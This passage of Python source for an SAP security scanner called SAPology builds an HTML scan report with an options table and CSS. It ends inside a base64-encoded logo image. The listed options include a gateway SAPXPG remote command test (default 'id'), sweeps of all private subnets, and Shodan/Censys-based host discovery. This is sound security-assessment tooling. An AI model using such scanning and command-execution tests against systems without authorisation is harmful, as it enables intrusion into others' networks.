    <tbody>
    %s
    </tbody>
  </table>
</details>
""" % (total_urls, total_urls, url_scan_rows)

    scan_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    duration_str = str(timedelta(seconds=int(scan_duration)))

    # Build scan options table with all options, defaults, and selected values
    sp = scan_params or {}
    targets_display = ", ".join(sp.get("targets", [])[:10])
    if len(sp.get("targets", [])) > 10:
        targets_display += " ... and %d more" % (len(sp["targets"]) - 10)
    instances_list = sp.get("instances", [])
    if len(instances_list) > 20:
        inst_display = "%s-%s (%d instances)" % (instances_list[0], instances_list[-1], len(instances_list))
    else:
        inst_display = ", ".join(instances_list) if instances_list else "00-99"

    scan_options_rows = ""
    options_spec = [
        ("--target, -t", targets_display or "N/A", "(required)", "Target IP, hostname, or CIDR range"),
        ("--target-file, -T", sp.get("target_file", "not used"), "not used", "File with one target per line"),
        ("--instances", inst_display, "00-99", "SAP instance number range to scan"),
        ("--timeout", "%ds" % sp.get("timeout", 3), "3s", "Per-connection timeout"),
        ("--threads", str(sp.get("threads", 20)), "20", "Parallel scan threads"),
        ("--skip-vuln", "Yes" if sp.get("skip_vuln") else "No", "No", "Skip vulnerability checks"),
        ("--skip-url-scan", "Yes" if not sp.get("url_scan", True) else "No", "No",
         "Skip ICM URL scanning (1633 paths)"),
        ("--url-scan-threads", str(sp.get("url_scan_threads", 25)), "25", "URL scan parallel threads"),
        ("--gw-test-cmd", html.escape(sp.get("gw_test_cmd", "id")), "id",
         "Command for gateway SAPXPG test"),
        ("--output, -o", html.escape(sp.get("output", "auto")), "auto",
         "HTML report output path"),
        ("--json", html.escape(sp.get("json_output", "not used")), "not used", "JSON export path"),
        ("-v, --verbose", "Yes" if sp.get("verbose") else "No", "No", "Verbose terminal output"),
        ("--hail-mary",
         ("Yes (%d hosts found)" % sp.get("hail_mary_hosts_found", 0))
             if sp.get("hail_mary") else "No",
         "No", "Scan all RFC 1918 private subnets"),
    ]

    # Add BTP options if BTP params are present
    if sp.get("btp_target") or sp.get("btp_discover") or sp.get("btp_domain") \
       or sp.get("btp_subaccount") or sp.get("btp_targets") or btp_results:
        options_spec.extend([
            ("--btp-target", html.escape(sp.get("btp_target", "")) or "not used", "not used",
             "BTP hostname(s) to scan (comma-separated)"),
            ("--btp-discover", html.escape(sp.get("btp_discover", "")) or "not used", "not used",
             "Search CT logs for organization keyword"),
            ("--btp-domain", html.escape(sp.get("btp_domain", "")) or "not used", "not used",
             "Target custom domain"),
            ("--btp-subaccount", html.escape(sp.get("btp_subaccount", "")) or "not used", "not used",
             "Known BTP subaccount identifier"),
            ("--btp-targets", html.escape(sp.get("btp_targets", "")) or "not used", "not used",
             "File with BTP URLs (one per line)"),
            ("--btp-regions", sp.get("btp_regions", "all"), "all",
             "BTP regions to scan"),
            ("--btp-skip-ct", "Yes" if sp.get("btp_skip_ct") else "No", "No",
             "Skip Certificate Transparency log search"),
            ("--btp-skip-vuln", "Yes" if sp.get("btp_skip_vuln") else "No", "No",
             "Skip BTP vulnerability assessment"),
            ("--shodan-key", sp.get("shodan_key", "") or "not used", "not used",
             "Shodan API key for infrastructure discovery"),
            ("--censys-id", sp.get("censys_id", "") or "not used", "not used",
             "Censys API ID"),
            ("--censys-secret", sp.get("censys_secret", "") or "not used", "not used",
             "Censys API secret"),
        ])
    for opt, value, default, description in options_spec:
        # Highlight non-default values
        is_default = (value == default)
        val_style = 'color: var(--text-dim)' if is_default else 'color: #2ecc71; font-weight: bold'
        scan_options_rows += """
        <tr>
          <td>%s</td>
          <td style="%s">%s</td>
          <td>%s</td>
          <td>%s</td>
        </tr>""" % (html.escape(opt), val_style, value, default, html.escape(description))

    html_content = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SAPology Scan Report</title>
<style>
  :root { --bg: #0f0f1a; --card-bg: #1a1a2e; --text: #e0e0e0; --text-dim: #8a8a9a;
          --border: #2a2a3e; --accent: #5dade2; }
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
         background: var(--bg); color: var(--text); line-height: 1.6; padding: 20px; }
  h1 { color: var(--accent); margin-bottom: 10px; font-size: 24px; }
  h2 { color: var(--accent); margin: 30px 0 15px; font-size: 18px; border-bottom: 1px solid var(--border);
       padding-bottom: 8px; }
  h3 { color: #ecf0f1; margin-bottom: 10px; }
  .summary { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
             gap: 15px; margin: 20px 0; }
  .summary-card { background: var(--card-bg); border-radius: 8px; padding: 15px;
                  text-align: center; border: 1px solid var(--border); }
  .summary-card .number { font-size: 32px; font-weight: bold; }
  .summary-card .label { font-size: 12px; color: var(--text-dim); text-transform: uppercase; }
  .topology { background: var(--card-bg); border-radius: 8px; padding: 20px;
              margin: 20px 0; overflow-x: auto; border: 1px solid var(--border); }
  table { width: 100%%; border-collapse: collapse; margin: 10px 0; font-size: 13px; }
  th { background: #0d1b2a; color: var(--accent); padding: 10px 12px; text-align: left;
       border-bottom: 2px solid var(--border); font-weight: 600; }
  td { padding: 8px 12px; border-bottom: 1px solid var(--border); vertical-align: top; }
  tr:hover { background: rgba(93,173,226,0.05); }
  .severity-badge { padding: 3px 8px; border-radius: 4px; font-size: 11px;
                    font-weight: bold; color: white; display: inline-block; min-width: 70px;
                    text-align: center; }
  .system-card { background: var(--card-bg); border-radius: 8px; padding: 20px;
                 margin: 15px 0; border: 1px solid var(--border); }
  .system-meta { color: var(--text-dim); font-size: 13px; margin-bottom: 15px; }
  .detail-cell { max-width: 400px; word-wrap: break-word; font-size: 12px; }
  .metadata { background: var(--card-bg); border-radius: 8px; padding: 20px;
              margin: 20px 0; border: 1px solid var(--border); }
  .metadata pre { color: var(--text-dim); font-size: 12px; white-space: pre-wrap; }
  .collapsible-section { background: var(--card-bg); border: 1px solid var(--border);
                         border-radius: 8px; margin: 10px 0; }
  .collapsible-section summary { cursor: pointer; padding: 12px 16px; color: var(--accent);
                                  font-weight: 600; font-size: 13px; user-select: none; }
  .collapsible-section summary:hover { background: rgba(93,173,226,0.08); }
  .collapsible-section[open] summary { border-bottom: 1px solid var(--border); }
  .collapsible-section > table { margin: 0; }
  .scan-options-table td:first-child { font-weight: 600; color: var(--accent); white-space: nowrap; }
  .scan-options-table td:nth-child(2) { color: var(--text); }
  .scan-options-table td:nth-child(3) { color: var(--text-dim); font-size: 12px; }
  .footer { text-align: center; color: var(--text-dim); font-size: 11px; margin-top: 40px;
            padding: 20px; border-top: 1px solid var(--border); }
</style>
</head>
<body>

<div style="margin-bottom: 25px; text-align: center;">
<img src="data:image/gif;base64,R0lGODlhIAMEAYcAAAD/QQD9QQD7QAD4QAH0PwHuPQHoPAHlOwLcOQLZOALVNwPPNgDNMwPMNQDMMwHKMwHIMwHHMgHEMgLBMQO/MQK7MAO1LwOwLgCqAASoLASmLASjKwWdKgaVKAWOJgWLJQWHJAaBIwZ8IgZ4IQd0IAdxGgdtHwZlHgBnIgBmIgBkIQdgHAFhIQFeIABiIQZbHAFdHwBZAglXGgJXHgBVABZOGglRGBpKGhlIGQlIFgVSGwRNGwRJGgBHAhhFGBhBGBRCFwpDFQZEGAZBERc+FhQ8FgJEBgBEAABDAAFCAQI/AgI9AgI8Axo6Ggs6ERU3FRQzEwwyEQc4Ewc0EAM4AwA4AgM2AwM0BAQzBAUxBAAyABMvEgwvEQ8sEQkuDworDAUvBgYtBgEvAQItAgYsBgMrAw8qEAoqEAoqCgcqCBEoEAwnDwsnDgwlDgslDhAkDwwkDgskDhAjDwwjDgwjDQsjDQ4iDgwiDgwiDQsiDgsiCgknCwYoBQYnBgUmBQglCQglBgYlBQojDAciBg4gDgwhDgwhDQwgDgwgDQshDgsgDQkhCgcgBw8fDQ0fDQ0fDA0eDQ0eDAwfDQweDQweDA8dDQ0dDQ0dDAwdDQwdDA4cDQ0cDQ0cDAwcDQwcDAsfDQseDgseDQsdDgsdDQsdCwoeCwkeBwkdCAscDQscDAscCwkcCA4bDA0bDQ0bDA0bCw4aDA0aDA0aCwwbDQwbDAwbCwwaDAwaCwsbDQsbDAsbCwsaDAobCgkbCA4ZDA0ZDA0ZCw0YDA0YCwwZDAwZCwwYDAwYCwsZDAsZCwsZCgsYDAsYCwsYCg0XCwwXDAwXCwsXCwsXCQoZCQoXCwoXCgoXCQkXCQ0WCwwWDAwWCwwWCg0VCwwVCwwVCgwUCwwUCgsWCgoWCwoWCgoWCQsVCgoVCgoVCQsUCgoUCgoUCQkUCgwTCgsTCwsTCgsSCgsRCgoRCQoQCQoPCQoOCQkOCQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH/C05FVFNDQVBFMi4wAwEAAAAh+QQAMgAAACwAAAAAIAMEAQAI/wDrCRxIcGCTgwgTKlzIsKHDhxAjSpxIsaLFixgzatzIsaPHjyBDihxJsqTJkyhTqlxpslzBlzAJspxJs6bNmzhz6tzJs6fPn0CDppQXs6jCd0iTKl3KdKm7p1CjSp1KtarVq1izat3KtavXr2ChthtLtqzZs2jTql3Ltq3bs2Hjyp1Lt67du1Kb6t3Lt6/fv4AD/41HuLDhw4gTK17MuLHjx4blSZ5MubLly5gza56skGhRmQcF68VLurTp06Tfql7NurXr16tRy55Nu3ZU0bhz694dGLLv38CD+95MvLhxzAg9Gz0Irbnz59CjQ1tGvbr169iza9/Ovbv37+DDi/8fLx6Z+fPo06tfz769+/fw48ufT7++e/L48+vfz7//fukABijggAQWaOCBAoqj4IIMNujggxBGKOGEFFa4YDkYZqjhhhx26OGHIGaIkEswIZSbbSimqKJYsLXo4oswxihjayvWaONpvOWo446ACefjj0A2dtyQRGaWXIlNCHbjkkx2NeOTUEYp5ZQxNmnllVTxqOWWPAbp5Zc/FilmkQcpZ1CSfmGp5pJUtunmm3DGmdaadK7I5Z14CgbmnnwKOeafxJUJmoD+FWrooYhuZ9+ijDbq6KOQRirppIwmaumlmJKH4KacduqpgRaGKuqopFIY4qmopipiEyTWE5pTdcb/ipectLq4zq245qrrrrz26muvtQbrmqzE1pXnscgq1eeyzMYD6LOWCeoqmu8Ua61Xwtb667bcduvtt+B6my2t15arVbLo4tnsumBC666gB5krr1TjRhnuvfjmq++++dYL5bwAP5XuwDuyazCQ7gIKbxOZNuxwfpRGHB8xFFds8cUYZ6zxxhx37PHHIIcs8sgeS2xyew+nrHJ4n7bs8ssJlirzzDQ/qOrNqR5UTrwBq+kva/wGLfTQRBdttK4/x9YzsQQ3rdvBUP+WMJkILX1j0mwdrfXWXHftNbdYr2U1nU6X3VvUaPs5dXEJjV1b2Gd9LffcdNftNdxmuW2l2Xz3/5X234mtHShCK4MHxBaFYydfDYzTcnJ6IB8e8hNFWMx4Da6QrPnmnHfu+eegh07x444mbnrDMKeuOqc1t+66qDjHvirPahKhhoqw/XJDNk/ua/u+vtxwjd3EF2/83HDrbWPfzC8F+POECX5Z2101cvtdhPggle20xag777AZ/bu+wQ9//Pnop1801sqr2Pz70D8vPWXUa/XMEzjgAEU2dmW//fWpgdL3VPO18eWrfOpLoAIX2C9/tc8272Ne/AA3P3kkJDxFsN0WutAF7vjgCT64QRFo4YgadII6kKgBJAhxOcY9gTpAgAIQagAEWlCHFkW4AQ6esAsYypCGNrzOef88QQQdQuE8jsjhDndhng+GcITm8YQSn6CL86TQcUOcYi2IAYkZAqEIlWOhJSiWwkaALoZAuAEQOEGMRkzxFhTrAuMqZ7EUZo5javCBHrcgQoq5UYdPgCMxiFCENNbADGIkYw3MKLpGOvKRkIykxkgnn9NZ8j+ry6Qmo/O6TnqyQbILUf2yUgQzWC8rRPCBJpxBBCi4gwhdeMoWigAV/0WFCD9oxTN+EEt3UO4ZsfjBFp6CS13y8ilo2QIRjFGMLWxiLFt4Azdc8QMzjCWVmihGK8dCOWNQcwtkGeBY1kE5YbBCmOsgwhOaQYgd3ooIW7jVLIeGS00IA53R5MY51ZD/Kyg8QVcI/NUbfNAMdQoDB8JYRz73easi4OAN28AVPOVZBAZa9KJaG9cDZRNBvk0wbWsbJVYI8YMn7A8r8HzKQN2hhh88xQcAtCVUUuqOLTzBHe24QSOe0lJiDrMdNlXLLJ8h1CdcE5ztGGg7znEDQozFDD8gS0DX8Y2m3qqlwrgBK271hH+uo6W3gik946lQr+LKpv00662m2qs3EIGc8fRBJXSF1nUUAQq6Aus6xIrRvvqVaNnaqGk6WraPoi1hIsVKNrpQhGpehXvugMQN3OENHDSind6opfZueT2busMZN/jFU+SgvXbYDppGTQs3lClMcoxFDkTAwQ1EeE01/4ylETdoRzFuEIuxDBRXUw3GDWBxq4FW4gYRXYc/b7UNHBCincn1VQ5vgFdcTbe66eRnWdcBW9mKMK0AFZ6urlvct0Ihnj9oBHdjO9uK2pWsuGruc3EQ3b/a9776EpZgSUPYphkWau8inHje0AU71AAZ2/EBFKijBhxQh3JFeGF13uBg6xyOOlAowjKQUYM3bHgLPjDP4cyTYfh4wgdbQAYtatAFx8mwiUdERoORcYsOUwzEFeNEDS5RsRq/4cY+uEQNCEExMFYMwk8QneSIkWFXsDhzMrQY5S6mYx7jEQjEMCkxfCAHJ3cBylgeJBQwhmRJmvnMaE7zmSnJnku6+f87m4zz6j5JZ9eFcnZN4AoU5GAHNYD4sT7QZSuf0k7nRsUVN9AEZ2V503Z085u1Ra1Q35CNYNr2GTeQAzmyV4RrqlIYreRqEcyJTlzxVdSkjqc62enOWzUif+qlp3Zt2oxMd4PT4NXVqdtqXvQ2otZyuLUP3FsE+OLq1Zal6jeWzexmO/vZ0I62tKdN7Wnj99rdItd+6dJfgv3XYH9KrFU0AUIcFKESj93CD3bIDaj8wKVSgUIIXfnK2wE1tcYAoYJda1rb3lstscCfgs8xljyaO8PvhMK6n2A+YegbCtzIFWmpeyuH6xHi6/CFQ9WJ3XW8u2jjQ6vB7+reEM5WhxL/n7ev3KpcX3/VBwcvwrKLDe13V/vmOM+5zndubWz/Vdvbjku30/VtdolJ3Fc5JUoBGJViY0VOvTLg0Z5g7Ilem+fThifWt871rnv92T5PoJyCLvShI6vozaLaQcZDYO/4oIPXeUMNLJEdNp/nY293JAdd8YamVkwNKlRzyG5B+MIb/vCIT7ziCQ94Ryz+8ZCPvOQnT/nKW/7wgs/8I+1unjd7vjpyDn3L6kx6md0M6XOBrLthSq83hUvqQrsG/n6gXY/vum5f9/oPYJr73vv+974Pu9zgRPavmP1YaGeWcVCPGjgJf2vAj770p0/96vf8+UYjfvG3cvw8PQYe4A9///iTH7jB0a57bsL+0KzP/va7//3RV7/Q3rR97nefS4oRv/73T/7DbOaCmWJ3mjeAGnN5BniACJiACriADNiADoh4BBiBFmN3n3dJoneBCMIg1LCBHNiBHtiBpfc6H8J8cpF+8hcu8JeCKriCLEh9JxgublJ/V3F/XLJ/NniD4Nd/hYEcVTMrVPKC3dKCQjiERFiEXQeEYEMlMmgVNKgjT4GDUCh+OriDlUGCXNEmSNgrRriFXNiFXihtWcgrbbKEWdKEJxIVURiFUxg99CNg+kE6EphmDziHdFiHhGcLeJiHeriHfNiHfpiHdhiIgoiAcYhmpFOBiYOBitgc2vGBjv/4iCEoghhihVXxg2GobF/Ygt6wiZzYiZ74iaAYiqI4iqRYiqKYiUJ4ieughGQIFWb4F1iRhje4hmxIiVExJZeIitZnirzYi774i8AYjJ6oi9V3iVPSigLziqORFbJog7RIGLaIi0hIjL0njNZ4jdiYjdr4idSYe1l4jMiojErRFc2of88IgIpyMoXYSIPYjov3h/AYj/I4j/RYj/Z4j/iYj3vojvyIeesYOo+DiCmziKlDHo94kJHoOqgnJS/YjTm3jRAZkRI5kRTJjQ55cy8oJeFohmFRjjm4homVFmgwkiRZkiZ5kiiZkiq5kizZki75kjAZkzI5kzRZkzZ5kzj/mZM6uZM82ZM++ZNAGZRCOZREWZRGeZQ9+Rj1w5Dqd5HPVpFQGZVSOZVU6ZTOJn8auYTdVxfNCJKEYzL/yDn9+ID6WJZmeZZomZZquZZsCYhj2YBhuTkmI5CZQpAIUigHCYIJOTMJ0TvPZ5VUGZiCOZiEOZVWiX1RIoNDhxdqOIV9GSPCd5GFOZmUWZmWiY0XKXyJWX+EVRqN2X+P2SKRSY2XWZqmeZqoGYrdqJlPopjvcxo46JgI4ShxCTJveXltmZu6OY+00Ju++ZvAGZzCOZzEWZy/uZvImZx6eJuWV5sfM5d0mSh2GR2YAol7WSqhuRo+p4upGZjc8J3gGZ7i/zme5Fme5nme6Jme6vmd3VmVqOhz/7J9fTMb/KeD2ekW2JaJ7SmR69mf/vmfABqgALqfEZmJ2BafZMc3tGGO9okQb5GfXkig1iigFFqhFnqhGMqeEhqMX3igMyKfTlMbUtigBwEfzrkxzAl5yrmieWicLvqiMBqjMjqjNFqjNMqiLJqij3eik0Qp0YkoBKkyG3id2OmganFfXbihpZihTNqkTvqkTqqkpNiF99WaCTowKQIPsnkQaIFfXCilnwilYjqmZFqmAwqmnciF+PWhV5osKrKlTWAWSGqEaLqJZnqneJqneiqedeoNW1ilMtKmyIIiSQGas2kePHoxOnp4OP+Kljb6qJAaqZI6qZRaqTXaqGe5qIaXqBM4KT9aKKKnMs9BpKHSl39Fp0q6p6q6qqzaqhq6oUb4c4G6bYMKQcqCdgnhV0W4oa7aq776q3cKq0Qoq1VCq3lSG02BqwhxUUQoocD6rNAarVAqocPaV2wqWMdKG3vxbQnhnJqKqfVoqeI6ruRaruZ6ruMKrvSoqZxKDD76qZiUSagTM6T6ILmaQO7XDfq6r/rantL6rwAbsGPanqlorcWKrVwyG35hWPd6PjvHrxAbsRIrseZJmeCZDRibsRqLsQJroRubDR0bsqranQV7UbO6UXeCGj0yQQ1bPDk3sTAbs/zqnxV5sR//e7M4K7LqibMfm57b8LNAG7RCO7RDq7MA2rNlipoly0DX+kAJWxp6Ej/dSoCTVwtWe7VYm7Vau7VXi65e+7VgS5yuMLZkW7Zme7Zom7Zqu7ZsS7Zh+7aUqq5+qKOJ6qnwmh/yeiisU68L0rJz87IyG7gQC6w8W7iGq7E6C7TXsLiM27iO+7hEG7mSO7mUW7mVu6eHu7F4eposiFEn2z5Payy5AT1+6zWAK7ioa7OFS6aZy7PP8LqZ+6yT+7i0W7uOa7m4m7u6u7s/+6Stq7l5apqda7IwgrBaIrpPAzilC32ni7oxyw2/i7QXGr0Z+7rWe73Y+wyrq6e7a7vea7u8/xu+4ju+RRug1Au8e1qaK0i8xYuyxysXOqK8CIFmlse19mu/L+oJnlCu+tu/+huc/hvAAuwJmZAJA/y/b9u2Cry2nNDADtzACxzBEjzBFFzBrgC3wgkAGrzBHLzBNiq3y3mbPCopd4sfeTseqlOvy0s0WAexgEADMBzDMgzDTKANNmzDrusMOrzDPKzD2mu4qrux2TvERHy9xnDExZDESrzER4y9N5uh5Puz37u4FNDBVrzBNlC7UbzFXEy+4YmzaTDDYkwDTIC+5XnFVmyhlrm+THuwypOy9rclabPCQbN1EfvCYyzDNYzDQvwMPewMNvABFIAABSAABGAACWABHf9wAlzww79bxJBsxEi8xJRcyUlsDNcrvQDaxVPMuM1QxWjcwTIAvl1cyqZcuY17s2GcxzFcxmY8nqHMwRlamWy8QG6sN9laht4XNXSsL113x6zcyn3sxz1cDCSQALG8wQjgAUHgyK77DMbABgGAxiZgyZZsAKEcAANQAAgAARogAkFwydaryedpyp3cuM2QzqCczAAgA82Azukcz+c8z407tPRMz7zbydmwysHsyohrnuwMAE26xinYxi/ivuK4rVAztaKTgFubBjEQ0RI90RFtBPrbCRid0RrdCVEwAQHdwWyQ0fv7mwSMCSaNCScQyhdw0izd0iaNzR+twQcAAmz/YMAI/KIWnNNm+8ANvM7JLAOXcAk8PdScgLZEfdRIndQ8rdNMnbacEAYUHdUxYAQyGtDkCsK28JYnSsIlzDLTGWd72cso6HURqw38zMpM8MfFfAYIENMcnAd/bM3FsAGhbADDcNdLfNd6fdcw7dYAYAAyUAzj/M/fecpSTM/x3AzCsNjCAAw+HcsywNiJPdmUXdmWfdmYndmVfc+c/bjxfNZ5zATOzLFnzM5kSpkFbcvt+8YJrdDsItbekntlbdZijAVqfdtJ3AkL4NcbXAfFsMNyXQzD0NahHAR7fdx73dd+LQArgMmwm7HXYNiH3cmKzdjW3di/8AuPHcqRbd2a//3d4B3e4i3Pnf29lr3YwaAHYizaT0yeAW2mqA1/qn3QoNvaemEwsM0tvTfboE0Dtn3bPLzEI8DbvZ3Eem3gyC0FyRwCyK3XeLgLu6Dcfj0AQeDct3vK3pvY133dwJDdHv7hvxALsRAEVywDv3Dd453i373hLN7ii23Z5b245x0MNJ7e653O5Aye7x2skynf890iTmvfybouDK05Dmi/EE3RVLDRTN7SkiDhbn0GkzDlVF7lVT7gsUwBn7DlXN7lXA7lbj0BluDATa3AQx3UaJ7maB4JkNDmbu7mjhDncp4DJd7maq7UR63mer7nfN7nfv7nev7AbYvUl2AJhn7oe/8Q1UYAwWNrnFb9tuqq1XHJ1V3tHV+9SSGY31roe7NN2zP838VszXR+xRRwAlKQB6FwBlIgAyKgAcQNAG5gCw3u4HhoAR0sAB08AIqQCxDe6xCeC8CeC2Du1jkgDOl84Vx82S3e4SDe7CEu4rGghyRuxSae3Ruu2S6e7drO2MDQ7czu7M3u7cCw7S0e3sJQ4+iu3jPMBOTduO5t2iNLmD4udqvtNkLOFES+rPcSfZ3e31gQ3JUMAlcsAsFe8Ly+C7kwBSGgAHEQjxCeCgXQwRdgxTZg8BYv7FacAaOw8W4QBTbgAcPuAcHQ7os7vvBM2Rz+7eDu4dAe7Xw47aL84eP/fu3pvO0qv/I4n/M6j/PeTu4vXtnnju7pfuPHjuzhueOrWpjznj63bDX37jzMoum5In0Qe8OeLsP/DvBKPAx03cEKcPHAngoWvwt86OvAPuocbAME0MEdkApu//ZwnwqoAOUav/F2jwls8ABX/AAjX/SMq7u1C/TWvfMtL+J96Jswz8HV7uEz7/PCsPOQD+6FP/kiHvng3vguXt1CL/TqrsckX/JCyw1Iz6ry/n4/Dhv1/fRIEfXzO3h2uLW04AlfENVU4NK2jwlTbusSrwiKkAiJwPu97/vCD/zEz+XEz/secOts4NEcvADC//zQT/d1MP1zcAfWfwdBMM0dXABj/87oZe4KRJ3mkMAFJnABCmAAAlAACTABIRAEci4J8B//8o8I9F//aM/BL+AIbw4JlxAJfs7mAAFJIBcTFxQYEFAgwYQQQRw9hBhRYsQ5Ky4kIDDgwIUVkjx+BOlI0sSHAk2eRIky0iWWkSKdtBRTpsw9MWzeNHKJ005XPX3+7AlA6FCiQ2kdRZpU6VKmTZ0mtRVV6lSqVa1epXpL61auXb1+BcuV2FiyZc2eRZtW7Vlkbd2+hRv37TK6de3exZtX716+ffdCAxxY8GDChQ0fRpy4sDjGjR0/hhy5cRPKTdZdxpxZ8zfOnT1/Bh0adDfSpLOdfoaGxmrWWIq9hh079v+wYRaKAoCACxcq3qN8j+KdSniqXMWNHzeeCkLRBqM+FA3g5ff06QZuZ5iUXTsmTJ0S3AawKVizZtfMm9+WXn368+3dmycfv5kw+sKAneEgAPxQCUGsPg0CPBliieUXAw8Epj76gEnwwF/w028/APrDyqocvgNvgjNo0eC2BKZaAbwPCCTRQQOdAO8CEx0MpkUD9WCNNSaEic+99dSTkChuduSxRx9/BDJIIX/0pkgjj0QySSWXRFI0J5+E8hvNpqSySiuvnLIdLbfksksvuXQnTDHHJLNMM89EM0010XynTTffhDNOOeeks0475YwnTz335LNPP/OszDIsL4uyUCf/SyONm9OySS3G1VyTLdLXhjkmA/BO2I0633hDZTjhkMvFUzYiHKqDUGS47QRNfwslFOuKwk677TChALwuxiPPRvXe4/U8+chT8JcXCshxqAA6eGqpAG+TwRYCV4TWwWGLFerYZJE6gVTwDnCiw6ISSGqSV4lCgCoSnwUBvBeiXRFGR2essb0b06MWgCHvxTdfIJnkt19+DQX4yUEHJnjQLw9GuJ01F2a4YYfHvDNiiSem+M0/L8YY0MoGDrhjzkrjcdFGHYVU0tkoDQG8ADaQYtVNg/M05lRQGSXEok4IZdSiNGi1Z59bHXeoWGWdhLtab7s13l6Xdu/X+Rb8xQRt/6nF7tqjli2q2RLZNVHqeoWeJFkbBqD2AUu/9SQpD8DLASqpCFTgNgM24fpcd2OEN1d5561XX7//HtJfwQf3xmPDpSw4ccUvS7hxMB+GPPLIK6a88sozxrzPQNciJizPP/+qllqW8qSTL266iQruVmed9exCyUHCACYgwYs8bsf99kR257333W/n4LYp6qhjgaIOID555YkPWqgM5oA++jnuuAPDogqxRCdOetppe6C+B7/77luC5IUAviaKA0TWZ7/99mO/7YWPSkrppIdWOB99oTgwpH///+dC8yREAA/9zxBOyF/63Mc+SWCNKB2on/0gUhPUxcAIluge+IBSL/+rddCDHaxQCEVoFdCV0IScQ2EKVSgXFrYQGX6BYQxlOEO7KMaGN8RhDgMjGR72UByButLhPNaNHonMGaohmclkQ5tjHCNuOSJABmwQilVxyorUsZ5QEBCKT3wieEVxws965hEBDk1WmEDgbQrQImD9imm9clp9HiTAegVABp7AYx71mEcHDqVZUTlXgRx0rjPQkVp2zEQiFanIDujPQ4rM49GIYgBJ5FEpa7uNE+pmN0fRgAnBoFF5dLWeeqUHcKdE5Y4It8olCdFji4PlwBw3S8nV0pZqslwudVmnzPUSiFVyZcC84SMjIjFGJVPipJoogwTmSAEkyIPLXBaF63T/8RMnuI0IrGlNkJRREkSbxBqWc5sHBOMX9XHjG5v2Kzn+wltFGYAHgjCHKJDgANtCxB716Yk+CkUGtHhbIM8llXcSJZ5BgEM973mbAxSiddw5A9nkRoIonEEGDZBQAlanSGzGT59HQQA5t7aiQN5NRuek0Xv4Rq31pNKl+mJlTJsUTEPF0qZWmqXjbrlTnrpjlz8F6jt6mblfTommhioSMVFzxE4iM5mUOsYu0vW1A6hKmtQhwW1IYE1qFsUC2wQJGa/zzUm0IQo2+MBCb+MBA6Ezneq8htOeBowHSdSgOfDEIrnwxKKYYJ977CcA/gnQgJKIKlyw61AGYINEcmcS/3sFjwnAOYmsys0JIJlDBfaTAHDeQYAXgGQe4VcUEpyLpCXtJBNQGsq9kZKlN3ppbAMnU5ketVA3xa1mctq4nvZWckEFruWGmrHNncWExw2LVJpSutNVUHUPhe4kWvUJRYwgscWywBlyt93bEe8CtwlCHNww3pASpQBsiAMc1Lte9RoSfTYQCEu0Jz4Nhk98nJCvQDBZlBHgwb94oN4dgjA1ACzAgAc2xGiJ8gIGhjWs69svUfp7B+nNYcC3WUCFoScB8KyAveqNArE8pOE5NLIoBDjDHf7bPxMTBcUTMQlJKIg6I0BiJfP13vfqpcEP9tjHSBlhkEWIXCJ3RYVHRv+yWVy4ZLfQ0MlPhrIOpTxlKfvQypPZ2GZsC6UjKZVRTE1iMmFDm13sojhOmAD6FOAFKmrKZ80rgCLkLOezEcUGDv6Ie+tFgbbSR65wjSs76XMg4xUFAYjIhGNltQHwcOGvfBSQUv6DlEKT6xCTnQSjb8OFBxOwKAvAsyQiPJQEhDU7aexrdriTSLUKrbDPEiiBTLoa1SYolPJZabHm1VLZ9rpHtI3plqGUW2KvY7cI822yHRZcZlNsuBcrKqGE7SQkefkZYD6mmMdsizInxwYcrlcD4uDmnilYKBWYs5xHcJsPhFoSei7WAILQ51u/dWlybWchCNyBRE/WBh1+NB7/AztYq81h37IK679TFdbAhmCB6wtsqfGc5qJQ4IwKL4oNXh1rEs3ak7+wtdPOg6PX7lo9vkY5sFk5bScVG7fHRrayZY7LZtfcTs/2U7RZLpokWRvbrdH2pKJi5uIIZxRB4ICnc/QBMfosZUUBQboV0U8IuBveEhLACg7k1j/DEd9Q+wXGiSIDTGAaEdcFAL8DPnAPit2P2cGzIdDegbB2NOMPX58AJe5gE9xGAFGQ1RfJRVhnmfYXsfZ4rf1s72tso5Qmhy3KZavyVe48NC6/KcwPNnPOn8nmn8cTzvlU3M4V2fSTJp3pKhiD50J3ddrxCHXl/LvbnWEElQbPAIa3/7zkUXzs4wW+G0Q8FAFw4cPrvTp4DLACk9wYx/fV4H3Fl1+B9D2TJI4eX4dyATwg2H/mFgqD8e4+Q1gfjNA7vnq1L5QLtMH97hdBo98/f/eDmygJSD8c1jD8oYQgenAQoA9AhPmBCAmKiBnDCRtjCenTMWqpr+/5sQgEISGjwKwwvSJLsgxcISZbMijzwA/kCyoTwRFEjCvroV+yPNBYEp8zJqB7KtoYBqkgOqNjFdixgGYiihBoulCoA6VzpI7As+QjigMAgTVAEK6Tq3hJwvgIFgNZt6IQgLLDtEnQrIrLhLWLtGvBo/iDQtjDsyokCgpwn6kyqP8JMP+xjW9xt/8WG4oF0A5UgcIoOApAGikDQa13AbnFk4/3eDzImxfJmzzKE5wU/AzMsynN85LOU0SIAb1GbBPR2xMUJETOYBIWbKoXhMEY5Laim5kabJUX8MGhgIAdhENH2p9Q0zMBIIADaIAMEAH/ECR6q7clpEUmBLtYIMOhIAApxLTvYo6A46csfIo8eo4T+wi880WiWAD26Z9RA4ACMEPq8Z86I7X2YTgcBIAgyA5NC8M5pMNYHKSOS63VEjn36EM/jDxAdClBHMRJRBxDXBxETMRFVERHdERI1BMgcsdv4BdLDDNJyUQYHLrkoBlPPBVsJABFaDo2dKS9C6syKppEwiMgswX/B1GQWsRI+WinwytGF+PFyUrGoWgAYGQ7Wgg4RepIXTzGhwtJoWgA//GvlBSKAQiwmgywNLw/9wmrCFgrSSgE/hOKE/DGwgPHcIyFxCNHxruGc0THdFTHU2JHf9lHeIQleXwceuw8e2xEfIyHQLlAIguh5VI953I9TIs92eOd3FEe+yMKKeC94jFFonCC9CsjFfOf9fEIRzgJ+Xo+6fPLv8Qv6oMER+BCohAACsO+OZCkoaAABGufwHoB74PJ/ypM4lsv+nu/xRSKCXi/NViDpyuKKPDM0STNcbo/+vsw8xsKBIADmzGvNsDLvNTLCBpMR0BAm6gx+WLADXL